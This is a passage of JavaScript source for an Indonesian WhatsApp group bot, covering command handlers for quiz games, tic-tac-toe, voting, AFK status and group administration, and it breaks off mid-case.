                reply(monospace(`Pembeliaan game limit sebanyak ${args[1]} berhasil\n\nSisa Balance : $${getBalance(sender, listml)}\nSisa Game Limit : ${cekGLimit(sender, gcount, glimit)}/${gcount}`))
            }
                break
				
				
                case prefix+'akinator':
                if (isGroup) return reply(mess.private)
                if (akinator.hasOwnProperty(sender.split('@')[0])) return reply("Selesain yg sebelumnya dulu atuh")
                var get_result = await akiStart()
                if (get_result.status == 200) {
                  var { server, frontaddr, session, signature, question, step } = get_result.result
                  const data = {}
                  data["server"] = server
                  data["frontaddr"] = frontaddr
                  data["session"] = session
                  data["signature"] = signature
                  data["question"] = question
                  data["step"] = step
                  var ini_txt = `${question}\n\n`
                  ini_txt += "0 - Ya\n"
                  ini_txt += "1 - Tidak\n"
                  ini_txt += "2 - Saya Tidak Tau\n"
                  ini_txt += "3 - Mungkin\n"
                  ini_txt += "4 - Mungkin Tidak"
                  Manik.sendMessage(from, { text: ini_txt }, { quoted: m }).then(() => {
                     akinator[sender.split('@')[0]] = data
                  })
                } else {
                  reply(mess.error.api)
                }
                break
				
				
				
            case prefix+'cancelakinator':
                if (isGroup) return reply(mess.OnlyPM)
                if (!akinator.hasOwnProperty(sender.split('@')[0])) return reply("Anda tidak memiliki akinator sebelumnya")
                delete akinator[sender.split("@")[0]]
                reply(`Sukses`)
                break
            case prefix+'tebak':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd) 
            if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
gameAdd(sender, glimit)
                if (!text) return reply(`Example : ${command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n6. lontong`)
                if (args[1] === "lagu") {
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) return reply `There are still unfinished sessions!`
                    let anu = await fetchJson('https://fatiharridho.github.io/tebaklagu.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    let msg = await Manik.sendMessage(m.chat, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, { quoted: m })
                    Manik.sendText(m.chat, `The song is a song from?\n\nArtist : ${result.artist}\nTime : 60s`, msg).then(() => {
                    tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Answer: " + result.jawaban)
                    Manik.sendButtonText(m.chat, [{ buttonId: prefix+'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `Time Out\nAnswer:  ${tebaklagu[m.sender.split('@')[0]]}\n\nWant to play? press the button below`, Manik.user.name, m)
                    delete tebaklagu[m.sender.split('@')[0]]
                    
                    }
                } else if (args[1] === 'gambar') {
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) return reply `There are still unfinished sessions!`
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    Manik.sendImage(m.chat, result.img, `Please answer the questions above\n\nDescription : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
                    tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Answer: " + result.jawaban)
                    Manik.sendButtonText(m.chat, [{ buttonId: prefix+'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `Time has run out\Answer:  ${tebakgambar[m.sender.split('@')[0]]}\n\nWant to play? press the button below`, Manik.user.name, m)
                    delete tebakgambar[m.sender.split('@')[0]]
                    
                    }
                } else if (args[1] === 'kata') {
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) return reply `There are still unfinished sessions!`
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    Manik.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nTime : 60s`, m).then(() => {
                    tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Answer: " + result.jawaban)
                    Manik.sendButtonText(m.chat, [{ buttonId: prefix+'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `Time has run out\nAnswer:  ${tebakkata[m.sender.split('@')[0]]}\n\nWant to play? press the button below`, Manik.user.name, m)
                    delete tebakkata[m.sender.split('@')[0]]
                    
                    }
                } else if (args[1] === 'kalimat') {
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) return reply `There are still unfinished sessions!`
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    Manik.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nTime : 60s`, m).then(() => {
                    tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Answer: " + result.jawaban)
                    Manik.sendButtonText(m.chat, [{ buttonId: prefix+'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, Manik.user.name, m)
                    delete tebakkalimat[m.sender.split('@')[0]]
                    
                    }
                } else if (args[1] === 'lirik') {
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) return reply `There are still unfinished sessions!`
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    Manik.sendText(m.chat, `These are the lyrics of the song? : *${result.soal}*?\nTime : 60s`, m).then(() => {
                    tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Answer: " + result.jawaban)
                    Manik.sendButtonText(m.chat, [{ buttonId: prefix+'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, Manik.user.name, m)
                    delete tebaklirik[m.sender.split('@')[0]]
                    
                    }
                } else if (args[1] === 'lontong') {
                    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) return reply `There are still unfinished sessions!`
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    Manik.sendText(m.chat, `*Answer the following questions :*\n${result.soal}*\nTime : 60s`, m).then(() => {
                    caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
		    caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
                    })
                    await sleep(60000)
                    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Answer: " + result.jawaban)
                    Manik.sendButtonText(m.chat, [{ buttonId: prefix+'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, Manik.user.name, m)
                    delete caklontong[m.sender.split('@')[0]]
		    delete caklontong_desk[m.sender.split('@')[0]]
		
                    }
                }
            }
            break
            case prefix+'afk':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
            if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
                let user = global.db.users[m.sender]
                user.afkTime = + new Date
                user.afkReason = text
                reply(`${m.pushName} Already Afk${text ? ': ' + text : ''}`)
            }
            break	
        case prefix+'ttc': case prefix+'ttt': case prefix+'tictactoe':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
gameAdd(sender, glimit)
            let TicTacToe = require("./FuncBot/tictactoe")
            this.game = this.game ? this.game : {}
            if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return reply `You are still in the game`
            let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
            if (room) {
            reply('Partner found!')
            room.o = m.chat
            room.game.playerO = m.sender
            room.state = 'PLAYING'
            let arr = room.game.render().map(v => {
            return {
            X: '❌',
            O: '⭕',
            1: '1️⃣',
            2: '2️⃣',
            3: '3️⃣',
            4: '4️⃣',
            5: '5️⃣',
            6: '6️⃣',
            7: '7️⃣',
            8: '8️⃣',
            9: '9️⃣',
            }[v]
            })
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Waiting @${room.game.currentTurn.split('@')[0]}

Type *give up* to surrender and admit defeat`
            if (room.x !== room.o) await Manik.sendText(room.x, str, m, { mentions: parseMention(str) } )
            await Manik.sendText(room.o, str, m, { mentions: parseMention(str) } )
            } else {
            room = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            game: new TicTacToe(m.sender, 'o'),
            state: 'WAITING'
            }
            if (text) room.name = text
            reply('Waiting for partner' + (text ? ` type the command below ${prefix}${command.slice(1)} ${text}` : ''))
            this.game[room.id] = room
            }
            }
            break
            case prefix+'delttc': case prefix+'delttt':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
            if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
            this.game = this.game ? this.game : {}
            try {
            if (this.game) {
            delete this.game
            Manik.sendText(m.chat, `Successfully delete the TicTacToe session`, m)
            } else if (!this.game) {
            reply(`TicTacToe Session🎮 there is not any`)
            } else reply `?`
            } catch (e) {
            reply('error')
            }
            }
            break
            case prefix+'suitpvp': case prefix+'suit':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
gameAdd(sender, glimit)
            this.suit = this.suit ? this.suit : {}
            let poin = 10
            let poin_lose = 10
            let timeout = 60000
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) return reply(`Complete your previous suit`)
	    if (m.mentionedJid[0] === m.sender) return reply(`Can't play with myself !`)
            if (!m.mentionedJid[0]) return reply(`_Who do you want to challenge?_\nTag the person..\n\nExample : ${prefix}suit @${owner[1]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return reply `The person you are challenging is playing suit with someone else :(`
            let id = 'suit_' + new Date() * 1
            let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} challenging @${m.mentionedJid[0].split`@`[0]} to play suit

Please @${m.mentionedJid[0].split`@`[0]} to type accept/reject`
            this.suit[id] = {
            chat: await Manik.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: 'wait',
            waktu: setTimeout(() => {
            if (this.suit[id]) Manik.sendText(m.chat, `_Suit time out_`, m)
            delete this.suit[id]
            }, 60000), poin, poin_lose, timeout
            }
            }
            break
	    case prefix+'donasi': case prefix+'donate': case prefix+'buypremium': case prefix+'donate':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                reply(` MENU DONATE \n\nHi ${pushname} \n\`\`\`DANA : 083155997772\`\`\`\n\`\`\`PULSA : 083155997772 (AXIS)\`\`\`\nTerimakasih untuk kamu yang sudah donasi untuk perkembangan bot ini _^\n THX FOR YOU ! `)
            }
            break
            case prefix+'sc': case prefix+'script':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                reply('*Minta Ke Owner Aja Klo Dikasi Kau Beruntung*')
            }
            break
            case prefix+'chat':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
            
                if (!isManik) return reply(mess.owner)
                if (!q) return reply `Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete`
                if (args[1] === 'mute') {
                    Manik.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                } else if (args[1] === 'unmute') {
                    Manik.chatModify({ mute: null }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                } else if (args[1] === 'archive') {
                    Manik.chatModify({  archive: true }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                } else if (args[1] === 'unarchive') {
                    Manik.chatModify({ archive: false }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                } else if (args[1] === 'read') {
                    Manik.chatModify({ markRead: true }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                } else if (args[1] === 'unread') {
                    Manik.chatModify({ markRead: false }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                } else if (args[1] === 'delete') {
                    Manik.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                }
            }
            break 
			
			
            case prefix+'mathquiz': case prefix+'math':{
            if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
gameAdd(sender, glimit)
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) return reply(`There are still unfinished sessions!`)
                let { genMath, modes } = require('./src/math')
                if (!text) return reply(`Mode: ${Object.keys(modes).join(' | ')}\nExample: ${prefix}math medium`)
                let result = await genMath(text.toLowerCase())
                Manik.sendText(m.chat, `*What is the result of: ${result.soal.toLowerCase()}*?\n\nTime: ${(result.waktu / 1000).toFixed(2)} seconds`, m).then(() => {
                    kuismath[m.sender.split('@')[0]] = result.jawaban
                })
				
                await sleep(result.waktu)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Answer: " + result.jawaban)
                    reply("Time Out\nAnswer: " + kuismath[m.sender.split('@')[0]])
                    delete kuismath[m.sender.split('@')[0]]
                }
            }
            break
			
			
            case prefix+'mysoulmate':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
            if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
            if (!m.isGroup) return reply(mess.group)
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `👫Your match is

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
            let ments = [me, jodoh]
            let buttons = [
                        { buttonId: prefix+'❤️', buttonText: { displayText: '❤️' }, type: 1 }
                    ]
                    await Manik.sendButtonText(m.chat, buttons, jawab, Manik.user.name, m, {mentions: ments})
            }
            break
            case prefix+'couple':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
            if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
            if (!m.isGroup) return reply(mess.group)
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}
Ciee Whats Going On💖👀`
            let menst = [orang, jodoh]
            let buttons = [
                        { buttonId: prefix+'❤️congrats', buttonText: { displayText: '❤️congrats' }, type: 1 }
                    ]
                    await Manik.sendButtonText(m.chat, buttons, jawab, Manik.user.name, m, {mentions: menst})
            }
            break
case prefix+'gantiharga':
if (isNaN(parseInt(q))) return reply('Nominal Harus Berupa Angka!')
global.hargasewa = q
reply(`Sukses Mengganti Harga Sewa Bot Menjadi ${formatmoney(q)}`)
break
case prefix+'hargasewa':
reply(`Harga Sewa Bot ${formatmoney(global.hargasewa)}`)
break
            case prefix+'join':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!isManik) return reply(mess.owner)
                if (!text) return reply `Masukkan Link Group`
                if (!isUrl(args[1]) && !args[1].includes('whatsapp.com')) return reply `Link Invalid`
                reply('Segera Tuan')
                let result = args[1].split('https://chat.whatsapp.com/')[1]
                await Manik.groupAcceptInvite(result).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
            }
            break
            case prefix+'leave':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!isManik) return reply(mess.owner)
                await Manik.groupLeave(m.chat).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
            }
            break
	case prefix+'kick':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
			 reply(`\`\`\`Mohon Maaf,\nFitur Sedang Tidak Dapat Digunakan\`\`\``)
		/*if (!m.isGroup) return reply(mess.group)
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (!isAdmins) return reply(mess.admin)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await Manik.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
	*/}
	break
	case prefix+'add':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
			 reply(`\`\`\`Mohon Maaf,\nFitur Sedang Tidak Dapat Digunakan\`\`\``)
	/*	if (!m.isGroup) return reply(mess.group)
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (!isAdmins) return reply(mess.admin)
		let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await Manik.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
	*/}
	break
	
	//PROMOTE
	case prefix+'promote':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
				if (!m.isGroup) return reply(mess.group)
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (!isAdmins) return reply(mess.admin)
				if (!m.mentionedJid[0]) throw reply(`tag yang mau dinaikkan jabatannya`)
					
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await Manik.groupParticipantsUpdate(m.chat, [users], 'promote')
	}
	break
	
	//DEMOTE
	case prefix+'demote':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
		if (!m.isGroup) return reply(mess.group)
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (!isAdmins) return reply(mess.admin)
					if (!m.mentionedJid[0]) throw reply(`tag yang mau diturunkan jabatannya`)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await Manik.groupParticipantsUpdate(m.chat, [users], 'demote')
	}
	break
	
	
        case prefix+'block':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
		if (!isManik) return reply(mess.owner)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await Manik.updateBlockStatus(users, 'block').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
	}
	break
        case prefix+'unblock':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
		if (!isManik) return reply(mess.owner)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await Manik.updateBlockStatus(users, 'unblock').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
	}
	break
	    case prefix+'setname': case prefix+'setsubject':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!m.isGroup) return reply(mess.group)
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (!isAdmins) return reply(mess.admin)
                if (!text) return reply `Text ?`
                await Manik.groupUpdateSubject(m.chat, text).then((res) => reply(mess.success)).catch((err) => reply(jsonformat(err)))
            }
            break
          case prefix+'setdesc': case prefix+'setdesk':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!m.isGroup) return reply(mess.group)
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (!isAdmins) return reply(mess.admin)
                if (!text) return reply `Text ?`
                await Manik.groupUpdateDescription(m.chat, text).then((res) => reply(mess.success)).catch((err) => reply(jsonformat(err)))
            }
            break
          case prefix+'setpp': {
          	if (!isManik) return reply(mess.owner)
var media = await Manik.downloadAndSaveMediaMessage(quoted)
const { generateProfilePicture } = require("./FuncBot/myfunc")
var { img } = await generateProfilePicture(media)
await Manik.query({ tag: 'iq',attrs: { to: botNumber, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})
}
break

           case prefix+'setppgroup': case prefix+'setgrouppp': case prefix+'setgcpp': case prefix+'setppgrup': case prefix+'setppgc':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins) return reply(mess.admin)
                if (!quoted) return reply `Send/Reply Image With Caption ${command}`
                var media = await Manik.downloadAndSaveMediaMessage(quoted)
const { generateProfilePicture } = require("./FuncBot/myfunc")
var { img } = await generateProfilePicture(media)
await Manik.query({ tag: 'iq',attrs: { to: m.chat, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})
                reply(mess.success)
                }
                break
case prefix+'grupinfo': case prefix+'groupinfo':
try{
 var pic = await Manik.getProfilePicture(m.chat)
  } catch {
 var pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
  }
let ingfo = `*G R O U P  I N F O*\n\n*Name :* ${groupName}\n*ID Group :* ${m.chat}\n*Made :* ${moment(`${groupMetadata.creation}` * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss')}\n*Group Owner:* @${groupMetadata.owner.split('@')[0]}\n*Number Of Admins :* ${groupAdmins.length}\n*Number Of Participants :* ${participants.length}\n*Desc :* \n${groupMetadata.desc}`
ds = await getBuffer(pic)
Manik.sendMessage(m.chat, { image: ds,caption: ingfo, mentions: [groupMetadata.owner] }, { quoted: m})
break
            case prefix+'tagall': case prefix+'tag':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
            if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
                if (!m.isGroup) return reply(mess.group)
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (!isAdmins) return reply(mess.admin)
let teks = `══✪〘 *👥 Tag All* 〙✪══
 
 ➲ *Message : ${q ? q : 'blank'}*\n\n`
                for (let mem of participants) {
                teks += `≻ @${mem.id.split('@')[0]}\n`
                }
                Manik.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
                }
                break
				
				
                case prefix+'hidetag':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
				if (!m.isGroup) return reply(mess.group)
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (!isAdmins) return reply(mess.admin)
			  let users = participants.map(u => u.id)
			  let q = m.quoted ? m.quoted : m
			  let c = m.quoted ? m.quoted : m.msg
			  let msg = await conn.cMod(
				m.chat,
				await generateWAMessageFromContent(
				  m.chat,
				  {
					[c.toJSON ? q.mtype : 'extendedTextMessage']: c.toJSON ? c.toJSON() : {
					  text: await c || ''
					},
					mentions: await users
				  }, {
					quoted: null,
					userJid: conn.user.id
				  }
				),
				text || q.text, conn.user.jid,
				{
				  mentions: await users
				}
			  )
			  await Manik.relayMessage(m.chat, msg.message, {
				messageId: msg.key.id
			  })
			
			}
            break


	    case prefix+'style': case prefix+'styletext':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
	        if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // response when limit runs out
		            db.users[m.sender].limit -= 1 // -1 limit
		let { styletext } = require('./FuncBot/scraper')
		if (!text) return reply `Text Mana?`
                let anu = await styletext(text)
                let teks = `Entered Text:  ${text}\n\n`
                for (let i of anu) {
                    teks += `≻ *${i.name}* : ${i.result}\n\n`
                }
                reply(teks)
	    }
	    break
               case prefix+'vote':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
               if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
            if (!m.isGroup) return reply(mess.group)
            if (m.chat in vote) return reply `_There are still votes in this chat!_\n\n*${prefix}deletevote* - to delete votes`
            if (!text) return reply `Enter Reason for Vote, Example: *${command} Owner is handsome*`
            reply(`Voting starts!\n\n*${prefix}upvote* - for yes\n*${prefix}devote* - for no\n*${prefix}checkvote* - to check the votes\n*${prefix}deletevote* - to delete vote`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `*「 VOTE 」*

*Reason:* ${vote[m.chat][0]}

 [ UPVOTE ]
• Total: ${vote[m.chat][1].length}

 [ DEVOTE ]
• Total: ${vote[m.chat][2].length}

*${prefix}deletevote* - to delete votes`
let buttonsVote = [
  {buttonId: `${prefix}upvote`, buttonText: {displayText: 'UPVOTE'}, type: 1},
  {buttonId: `${prefix}devote`, buttonText: {displayText: 'DEVOTE'}, type: 1}
]

            let buttonMessageVote = {
                text: teks_vote,
                footer: Manik.user.name,
                buttons: buttonsVote,
                headerType: 1
            }
            Manik.sendMessage(m.chat, buttonMessageVote)
	    }
            break
               case prefix+'upvote':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
               if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
            if (!m.isGroup) return reply(mess.group)
            if (!(m.chat in vote)) return reply `_*no voting in this group!*_\n\n*Type ${prefix}vote* - to start voting`
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return reply `You have Voted`
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 VOTE 」*

*Reason:* ${vote[m.chat][0]}

 [ UPVOTE ]
 
• Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `• ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 


 [ DEVOTE ]
 
• Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `• ${i + 1}. @${v.split`@`[0]}`).join('\n')}

*${prefix}hapusvote* - to delete votes`
            let buttonsUpvote = [
  {buttonId: `${prefix}upvote`, buttonText: {displayText: 'UPVOTE'}, type: 1},
  {buttonId: `${prefix}devote`, buttonText: {displayText: 'DEVOTE'}, type: 1}
            ]

            let buttonMessageUpvote = {
                text: teks_vote,
                footer: Manik.user.name,
                buttons: buttonsUpvote,
                headerType: 1,
                mentions: menvote
             }
            Manik.sendMessage(m.chat, buttonMessageUpvote)
	    }
             break
                case prefix+'devote':{
             addCountCmd(`#${command.slice(1)}`, sender, _cmd)
                if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
            if (!m.isGroup) return reply(mess.group)
            if (!(m.chat in vote)) return reply `_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return reply `You have Voted`
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 VOTE 」*

*Reason:* ${vote[m.chat][0]}

 [ UPVOTE ]
 
• Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `• ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 


 [ DEVOTE ]
 
• Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `• ${i + 1}. @${v.split`@`[0]}`).join('\n')}

*${prefix}hapusvote* - to delete votes`
            let buttonsDevote = [
  {buttonId: `${prefix}upvote`, buttonText: {displayText: 'UPVOTE'}, type: 1},
  {buttonId: `${prefix}devote`, buttonText: {displayText: 'DEVOTE'}, type: 1}
            ]

            let buttonMessageDevote = {
                text: teks_vote,
                footer: Manik.user.name,
                buttons: buttonsDevote,
                headerType: 1,
                mentions: menvote
            }
            Manik.sendMessage(m.chat, buttonMessageDevote)
	}
            break
                 
case prefix+'cekvote':
if (!isPremium && global.db.users[m.sender].limit < 1) return reply(mess.endLimit) // respon ketika limit habis
            db.users[m.sender].limit -= 1 // -1 limit
if (!m.isGroup) return reply(mess.group)
if (!(m.chat in vote)) return reply `_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`
teks_vote = `*「 VOTE 」*

*Reason:* ${vote[m.chat][0]}

 [ UPVOTE ]
 
• Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `• ${i + 1}. @${v.split`@`[0]}`).join('\n')}
 


 [ DEVOTE ]
 
• Total: ${devote.length}
